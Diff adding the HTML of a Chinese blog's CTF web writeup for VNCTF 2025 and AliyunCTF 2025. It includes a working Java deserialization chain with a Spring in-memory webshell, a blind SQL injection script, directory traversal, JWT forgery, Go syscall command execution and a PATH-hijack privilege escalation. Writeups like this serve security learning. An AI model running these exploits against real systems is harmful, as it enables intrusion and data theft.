@@ -1,0 +1,1088 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CTF记录-VNCTF_2025, AliyunCTF 2025 | zoiltin&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="VNCTF 2025 和 Aliyun CTF web方向writeup">
+<meta name="author" content="">
+<link rel="canonical" href="https://zoiltin.github.io/posts/ctf%E8%AE%B0%E5%BD%95-vnctf_2025-aliyunctf_2025/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.d72444526d7ecbdb0015438a7fa89054a658bf759d0542e2e5df81ce94b493ee.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://zoiltin.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://zoiltin.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://zoiltin.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://zoiltin.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://zoiltin.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://zoiltin.github.io/posts/ctf%E8%AE%B0%E5%BD%95-vnctf_2025-aliyunctf_2025/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+  
+
+<meta property="og:url" content="https://zoiltin.github.io/posts/ctf%E8%AE%B0%E5%BD%95-vnctf_2025-aliyunctf_2025/">
+  <meta property="og:site_name" content="zoiltin&#39;s Blog">
+  <meta property="og:title" content="CTF记录-VNCTF_2025, AliyunCTF 2025">
+  <meta property="og:description" content="VNCTF 2025 和 Aliyun CTF web方向writeup">
+  <meta property="og:locale" content="zh-CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-02-09T15:21:50+00:00">
+    <meta property="article:modified_time" content="2025-02-09T15:21:50+00:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CTF记录-VNCTF_2025, AliyunCTF 2025">
+<meta name="twitter:description" content="VNCTF 2025 和 Aliyun CTF web方向writeup">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://zoiltin.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CTF记录-VNCTF_2025, AliyunCTF 2025",
+      "item": "https://zoiltin.github.io/posts/ctf%E8%AE%B0%E5%BD%95-vnctf_2025-aliyunctf_2025/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CTF记录-VNCTF_2025, AliyunCTF 2025",
+  "name": "CTF记录-VNCTF_2025, AliyunCTF 2025",
+  "description": "VNCTF 2025 和 Aliyun CTF web方向writeup",
+  "keywords": [
+    
+  ],
+  "articleBody": "VNCTF 5道web解出了4道\njavaGuide /deser路由可以反序列化，有spring boot和fastjson 1.2.83的依赖。\n反序列化有黑名单：\nprotected Class\u003c?\u003e resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { String className = desc.getName(); String[] denyClasses = {\"com.sun.org.apache.xalan.internal.xsltc.trax\", \"javax.management\", \"com.fasterxml.jackson\"}; int length = denyClasses.length; for (String denyClass : denyClasses) { if (className.startsWith(denyClass)) { throw new InvalidClassException(\"Unauthorized deserialization attempt\", className); } } return super.resolveClass(desc); } 可以用signedObject二次反序列化绕过\n利用链：\nEventListenerList.readobject() -\u003e\rJSONArray.toString() -\u003e\rSignedObject.getObject() -\u003e\rEventListenerList.readobject() -\u003e\rJSONArray.toString() -\u003e\rTemplates.getOutputProperties() fastjson1.2.83使用引用绕过。\nTemplates templates = new TemplatesImpl(); setFieldValue(templates,\"_bytecodes\",new byte[][]{getEvilClass()}); setFieldValue(templates,\"_class\",null); setFieldValue(templates,\"_name\",\"asd\"); JSONArray jsonArray1 = new JSONArray(); jsonArray1.add(templates); EventListenerList list1 = new EventListenerList(); UndoManager manager1 = new UndoManager(); Vector vector1 = (Vector) getFieldValue(manager1,\"edits\"); vector1.add(jsonArray1); setFieldValue(list1, \"listenerList\", new Object[]{String.class, manager1}); HashMap hashMap1 = new HashMap(); hashMap1.put(templates, list1); KeyPairGenerator kpg = KeyPairGenerator.getInstance(\"DSA\"); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(hashMap1, kp.getPrivate(), Signature.getInstance(\"DSA\")); JSONArray jsonArray2 = new JSONArray(); jsonArray2.add(signedObject); EventListenerList list2 = new EventListenerList(); UndoManager manager2 = new UndoManager(); Vector vector2 = (Vector) getFieldValue(manager2,\"edits\"); vector2.add(jsonArray2); setFieldValue(list2, \"listenerList\", new Object[]{String.class, manager2}); HashMap hashMap2 = new HashMap(); hashMap2.put(signedObject,list2); byte[] code = ser(hashMap2); System.out.println(Base64.getEncoder().encodeToString(code)); 容器不出网，可以打一个spring的内存马，我这里用的是Spring Interceptor内存马\n注入器（通过Template.defineClass加载）\npackage com.example.javaguide; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.springframework.web.servlet.HandlerInterceptor; import org.springframework.web.servlet.handler.AbstractHandlerMapping; import java.lang.reflect.Field; import java.util.List; public class Evil extends AbstractTranslet { public Evil() throws Exception{ String encodedstr = \"\"; byte[] classBytes = java.util.Base64.getDecoder().decode(encodedstr); ClassLoader classLoader = Thread.currentThread().getContextClassLoader(); org.springframework.web.context.WebApplicationContext context = null; try { org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes(); Class cla = requestAttributes.getClass(); java.lang.reflect.Method me = cla.getDeclaredMethod(\"getRequest\", new Class[]{}); me.setAccessible(true); javax.servlet.http.HttpServletRequest httprequest = (javax.servlet.http.HttpServletRequest) me.invoke(requestAttributes, new Object[]{}); javax.servlet.http.HttpSession session = httprequest.getSession(); javax.servlet.ServletContext servletContext = session.getServletContext(); context = org.springframework.web.context.support.WebApplicationContextUtils.getWebApplicationContext(servletContext); } catch (Exception e) { e.printStackTrace(); } java.lang.reflect.Method defineclass = ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{byte[].class, int.class, int.class}); defineclass.setAccessible(true); HandlerInterceptor memShellInterceptor = null; try { memShellInterceptor = (HandlerInterceptor) Class.forName(\"com.example.javaguide.EvilInterceptor\").newInstance(); } catch (Exception e){ memShellInterceptor = (HandlerInterceptor) ((Class) defineclass.invoke(classLoader, classBytes, 0, classBytes.length)).newInstance(); } AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping) context.getBean(\"requestMappingHandlerMapping\"); Field field = AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\"); field.setAccessible(true); List\u003cObject\u003e adaptedInterceptors = (List\u003cObject\u003e) field.get(abstractHandlerMapping); adaptedInterceptors.add(memShellInterceptor); System.out.println(\"interceptor injected successfully\"); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } 其中encodedstr为恶意Interceptor类的字节码base64\n恶意Interceptor类：\npackage com.example.javaguide; import org.springframework.web.servlet.HandlerInterceptor; import org.springframework.web.servlet.ModelAndView; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; public class EvilInterceptor implements HandlerInterceptor { public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { try { Process exec = Runtime.getRuntime().exec(\"cat /flag\"); java.io.InputStream inputStream = exec.getInputStream(); javax.servlet.ServletOutputStream outputStream = response.getOutputStream(); byte[] buf = new byte[8192]; int length; while ((length = inputStream.read(buf)) != -1) { outputStream.write(buf, 0, length); } return false; } catch (Exception e) { e.printStackTrace(); } return true; } @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception { } @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception { } } 奶龙回家 返回包server为Werkzeug/3.1.3 Python/3.10.16，猜测为flask框架，凭经验来说一般搭配mysql或sqlite\nrandomblob(1000000000)可以延时，确定为sqlite数据库。\n通过测试猜测sql语句如下：\nselect * from users where username = '{username}' and password = '{password}'; 服务器应该还有一层检测，在flask路由处也会判断username和password是否正确。这就导致构造的万能密码无法登陆，但确可以盲注，当然也有可能时sql语句我猜错了。\n不过，至少以下payload可以时间盲注：\n{ \"username\" : \"asdasda'/**/or/**/(length(username)\u003e0)/**/or/**/randomblob(1000000000)\u003e\", \"password\" : \"/**/or/**/'zzzzzzzzzzzzzzz'\u003e'\" } 转换成sql语句如下(大概)：\nselect * from users where username = 'asdasda'/**/or/**/(length(username)\u003e0)/**/or/**/randomblob(1000000000)\u003e' and password = '/**/or/**/'zzzzzzzzzzzzzzz'\u003e'' 注释、空格以及等号被过滤了。\n当length(username)\u003e0成立时由于or的短路特性，后面表达式不会运行，也就不会延时。\nexp:\nimport requests url = 'http://' cha = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' # cha = 'abcdefghijklmnopqrstuvwxyz' payload = \"asdasda'/**/or/**/((substr(password,{},1)\u003c\u003e'{}'))/**/or/**/randomblob(1000000000)\u003e\" # password = 'woaipangmao114514' password = '' while len(password) \u003c 17: signal = True for c in cha: json = { \"username\" : payload.format(str(len(password) + 1), c), \"password\" : \"/**/or/**/'zzzzzzzzzzzzzzz'\u003e'\" } print(password + c, end='\\r') try: res = requests.post(url=url + '/login', json=json, timeout=1) except KeyboardInterrupt as e: print(password) exit() except: password = password + c signal = False break if signal: password = password + '_' print(password) 账密：nailong:woaipangmao114514\nGin 权限使用jwt验证，jwt的key生成代码：\nfunc GenerateKey() string { rand.Seed(config.Year()) randomNumber := rand.Intn(1000) key := fmt.Sprintf(\"%03d%s\", randomNumber, config.Key()) return key } 虽然用了随机数，但只要种子也就是config.Year()和config.Key()的值是固定的则key也是固定的。\n附件里的config目录里的key.go内容为空，需要从远程靶机获取。\n/download路由代码如下：\nfunc Download(c *gin.Context) { filename := c.DefaultQuery(\"filename\", \"\") if filename == \"\" { response.Response(c, http.StatusBadRequest, 400, nil, \"Filename is required\") } basepath := \"./uploads\" filepath, _ := url.JoinPath(basepath, filename) if _, err := os.Stat(filepath); os.IsNotExist(err) { response.Response(c, http.StatusBadRequest, 404, nil, \"File not found\") } c.Header(\"Content-Disposition\", \"attachment; filename=\"+filename) c.File(filepath) } 存在目录穿越，可以用来下载任意文件。\n下载key.go：/download?filename=../config/key.go,内容如下：\npackage config func Key() string { return \"r00t32l\" } func Year() int64 { return 2025 } 现在可以伪造admin的token：\npackage main import ( \"fmt\" \"math/rand\" \"time\" \"github.com/golang-jwt/jwt/v4\" ) func main() { token, err := GenerateToken(\"admin\") if err != nil { fmt.Println(\"error\") } fmt.Println(token) } func Key() string { return \"r00t32l\" } func Year() int64 { return 2025 } type JWTClaims struct { Username string `json:\"username\"` jwt.RegisteredClaims } func GenerateKey() string { rand.Seed(Year()) randomNumber := rand.Intn(1000) key := fmt.Sprintf(\"%03d%s\", randomNumber, Key()) return key } func GenerateToken(username string) (string, error) { key := GenerateKey() claims := JWTClaims{ Username: username, RegisteredClaims: jwt.RegisteredClaims{ ExpiresAt: jwt.NewNumericDate(time.Now().Add(24 * time.Hour)), IssuedAt: jwt.NewNumericDate(time.Now()), Issuer: \"Mash1r0\", Subject: \"user token\", }, } token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims) signedToken, err := token.SignedString([]byte(key)) if err != nil { return \"\", fmt.Errorf(\"生成 token 时出错: %v\", err) } return signedToken, nil } func ParseToken(tokenString string) (*JWTClaims, error) { key := GenerateKey() token, err := jwt.ParseWithClaims(tokenString, \u0026JWTClaims{}, func(token *jwt.Token) (interface{}, error) { return []byte(key), nil }) if err != nil { return nil, fmt.Errorf(\"解析 token 时出错: %v\", err) } if claims, ok := token.Claims.(*JWTClaims); ok \u0026\u0026 token.Valid { return claims, nil } else { return nil, fmt.Errorf(\"无效的 token\") } } /eval路由可以执行go代码，但不允许import os/exec库。可以用syscall绕过，这种命令执行较为底层。\npackage main import ( \"fmt\" \"os\" \"syscall\" ) func main() { // 定义要执行的命令和参数 cmd := \"/bin/sh\" // 命令路径 args := []string{ \"sh\", // 命令名 \"-c\", // 参数 \"ls -al /\", // 参数 } // 参数列表 // 创建子进程 attr := \u0026syscall.ProcAttr{ Files: []uintptr{ uintptr(syscall.Stdin), uintptr(syscall.Stdout), uintptr(syscall.Stderr), }, Env: os.Environ(), // 继承当前环境变量 } // ForkExec 的参数需要将 args 转换为字符串数组 argv := make([]string, len(args)+1) copy(argv, args) argv[len(args)] = \"\" // 以空字符串结尾 // 创建子进程 pid, err := syscall.ForkExec(cmd, argv, attr) if err != nil { fmt.Printf(\"ForkExec failed: %v\\n\", err) return } // 等待子进程结束 _, err = syscall.Wait4(pid, nil, 0, nil) if err != nil { fmt.Printf(\"Wait4 failed: %v\\n\", err) return } fmt.Println(\"Command executed successfully\") } 不知道是不是非预期，这么打的话没有用到/upload路由。\nflag并不在/flag里，真正的flag在/root/flag中，还需要提权。/.../Cat文件有suid权限。\n下载下来放到ida里看看： 会调用cat命令，可以通过修改环境变量中的$PATH，让root调用恶意的cat程序\n恶意cat代码如下：\n#include int main(){ system(\"/usr/bin/cat /root/flag\"); } 因为PATH修改了，所以expcat里需要用绝对路径，上传的话可以走/upload，不过会被ban，需要混淆一下。也可以直接base64通过/eval传进去，毕竟体积很小。\n执行：\nmv /tmp/expcat /tmp/cat \u0026\u0026 chmod +x /tmp/cat \u0026\u0026 export PATH=/tmp \u0026\u0026 /.../Cat 通过/eval路由执行命令是无状态的，所以export PATH=/tmp和/.../Cat必须一次执行。\n学生姓名登记系统 题目描述说单文件框架，大概就是python里flask，fastapi那一类的web框架。\n存在SSTI，fuzz后发现{{print}}输出，说明可以获取__builtins__里的内容。\n猜测服务器逻辑如下：\n黑名单匹配 判断每行是否超过23 尝试执行模板 若第三步报错，则将整个模板以文本输出 若第三步没报错，则将模板执行结果输出 可以通过{{globals()}}获取上下文环境。内容如下：\n{'_stdout': []\r'_printlist': 'include': functools.partial(",
+  "wordCount" : "1760",
+  "inLanguage": "en",
+  "datePublished": "2025-02-09T15:21:50Z",
+  "dateModified": "2025-02-09T15:21:50Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://zoiltin.github.io/posts/ctf%E8%AE%B0%E5%BD%95-vnctf_2025-aliyunctf_2025/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "zoiltin's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://zoiltin.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://zoiltin.github.io/" accesskey="h" title="zoiltin&#39;s Blog (Alt + H)">zoiltin&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://zoiltin.github.io/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zoiltin.github.io/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zoiltin.github.io/posts" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zoiltin.github.io/about" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      CTF记录-VNCTF_2025, AliyunCTF 2025
+    </h1>
+    <div class="post-description">
+      VNCTF 2025 和 Aliyun CTF web方向writeup
+    </div>
+    <div class="post-meta"><span title='2025-02-09 15:21:50 +0000 UTC'>February 9, 2025</span>&nbsp;·&nbsp;9 min
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#vnctf" aria-label="VNCTF">VNCTF</a><ul>
+                        
+                <li>
+                    <a href="#javaguide" aria-label="javaGuide">javaGuide</a></li>
+                <li>
+                    <a href="#%e5%a5%b6%e9%be%99%e5%9b%9e%e5%ae%b6" aria-label="奶龙回家">奶龙回家</a></li>
+                <li>
+                    <a href="#gin" aria-label="Gin">Gin</a></li>
+                <li>
+                    <a href="#%e5%ad%a6%e7%94%9f%e5%a7%93%e5%90%8d%e7%99%bb%e8%ae%b0%e7%b3%bb%e7%bb%9f" aria-label="学生姓名登记系统">学生姓名登记系统</a></li></ul>
+                </li>
+                <li>
+                    <a href="#aliyun-ctf" aria-label="Aliyun CTF">Aliyun CTF</a><ul>
+                        
+                <li>
+                    <a href="#ezoj" aria-label="ezoj">ezoj</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="vnctf">VNCTF<a hidden class="anchor" aria-hidden="true" href="#vnctf">#</a></h1>
+<p>5道web解出了4道</p>
+<h2 id="javaguide">javaGuide<a hidden class="anchor" aria-hidden="true" href="#javaguide">#</a></h2>
+<p><code>/deser</code>路由可以反序列化，有<code>spring boot</code>和<code>fastjson 1.2.83</code>的依赖。</p>
+<p>反序列化有黑名单：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> Class<span style="color:#f92672">&lt;?&gt;</span> resolveClass(ObjectStreamClass desc) <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
+</span></span><span style="display:flex;"><span>    String className <span style="color:#f92672">=</span> desc.<span style="color:#a6e22e">getName</span>();
+</span></span><span style="display:flex;"><span>    String<span style="color:#f92672">[]</span> denyClasses <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;com.sun.org.apache.xalan.internal.xsltc.trax&#34;</span>, <span style="color:#e6db74">&#34;javax.management&#34;</span>, <span style="color:#e6db74">&#34;com.fasterxml.jackson&#34;</span>};
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> length <span style="color:#f92672">=</span> denyClasses.<span style="color:#a6e22e">length</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (String denyClass : denyClasses) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (className.<span style="color:#a6e22e">startsWith</span>(denyClass)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> InvalidClassException(<span style="color:#e6db74">&#34;Unauthorized deserialization attempt&#34;</span>, className);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">super</span>.<span style="color:#a6e22e">resolveClass</span>(desc);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>可以用<code>signedObject</code>二次反序列化绕过</p>
+<p>利用链：</p>
+<pre tabindex="0"><code>EventListenerList.readobject()  -&gt;
+    JSONArray.toString()  -&gt;
+        SignedObject.getObject()  -&gt;
+            EventListenerList.readobject()  -&gt;
+                JSONArray.toString()  -&gt;
+                    Templates.getOutputProperties()
+</code></pre><p><code>fastjson1.2.83</code>使用引用绕过。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Templates templates <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
+</span></span><span style="display:flex;"><span>setFieldValue(templates,<span style="color:#e6db74">&#34;_bytecodes&#34;</span>,<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{getEvilClass()});
+</span></span><span style="display:flex;"><span>setFieldValue(templates,<span style="color:#e6db74">&#34;_class&#34;</span>,<span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>setFieldValue(templates,<span style="color:#e6db74">&#34;_name&#34;</span>,<span style="color:#e6db74">&#34;asd&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>JSONArray jsonArray1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> JSONArray();
+</span></span><span style="display:flex;"><span>jsonArray1.<span style="color:#a6e22e">add</span>(templates);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>EventListenerList list1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> EventListenerList();
+</span></span><span style="display:flex;"><span>UndoManager manager1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> UndoManager();
+</span></span><span style="display:flex;"><span>Vector vector1 <span style="color:#f92672">=</span> (Vector) getFieldValue(manager1,<span style="color:#e6db74">&#34;edits&#34;</span>);
+</span></span><span style="display:flex;"><span>vector1.<span style="color:#a6e22e">add</span>(jsonArray1);
+</span></span><span style="display:flex;"><span>setFieldValue(list1, <span style="color:#e6db74">&#34;listenerList&#34;</span>, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>, manager1});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HashMap hashMap1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
+</span></span><span style="display:flex;"><span>hashMap1.<span style="color:#a6e22e">put</span>(templates, list1);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>KeyPairGenerator kpg <span style="color:#f92672">=</span> KeyPairGenerator.<span style="color:#a6e22e">getInstance</span>(<span style="color:#e6db74">&#34;DSA&#34;</span>);
+</span></span><span style="display:flex;"><span>kpg.<span style="color:#a6e22e">initialize</span>(1024);
+</span></span><span style="display:flex;"><span>KeyPair kp <span style="color:#f92672">=</span> kpg.<span style="color:#a6e22e">generateKeyPair</span>();
+</span></span><span style="display:flex;"><span>SignedObject signedObject <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SignedObject(hashMap1, kp.<span style="color:#a6e22e">getPrivate</span>(), Signature.<span style="color:#a6e22e">getInstance</span>(<span style="color:#e6db74">&#34;DSA&#34;</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>JSONArray jsonArray2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> JSONArray();
+</span></span><span style="display:flex;"><span>jsonArray2.<span style="color:#a6e22e">add</span>(signedObject);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>EventListenerList list2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> EventListenerList();
+</span></span><span style="display:flex;"><span>UndoManager manager2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> UndoManager();
+</span></span><span style="display:flex;"><span>Vector vector2 <span style="color:#f92672">=</span> (Vector) getFieldValue(manager2,<span style="color:#e6db74">&#34;edits&#34;</span>);
+</span></span><span style="display:flex;"><span>vector2.<span style="color:#a6e22e">add</span>(jsonArray2);
+</span></span><span style="display:flex;"><span>setFieldValue(list2, <span style="color:#e6db74">&#34;listenerList&#34;</span>, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>, manager2});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HashMap hashMap2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
+</span></span><span style="display:flex;"><span>hashMap2.<span style="color:#a6e22e">put</span>(signedObject,list2);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> code <span style="color:#f92672">=</span> ser(hashMap2);
+</span></span><span style="display:flex;"><span>System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(Base64.<span style="color:#a6e22e">getEncoder</span>().<span style="color:#a6e22e">encodeToString</span>(code));
+</span></span></code></pre></div><p>容器不出网，可以打一个spring的内存马，我这里用的是Spring Interceptor内存马</p>
+<p>注入器（通过Template.defineClass加载）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> com.example.javaguide;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.servlet.HandlerInterceptor;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.List;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Evil</span> <span style="color:#66d9ef">extends</span> AbstractTranslet {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">Evil</span>() <span style="color:#66d9ef">throws</span> Exception{
+</span></span><span style="display:flex;"><span>        String encodedstr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> classBytes <span style="color:#f92672">=</span> java.<span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">Base64</span>.<span style="color:#a6e22e">getDecoder</span>().<span style="color:#a6e22e">decode</span>(encodedstr);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ClassLoader classLoader <span style="color:#f92672">=</span> Thread.<span style="color:#a6e22e">currentThread</span>().<span style="color:#a6e22e">getContextClassLoader</span>();
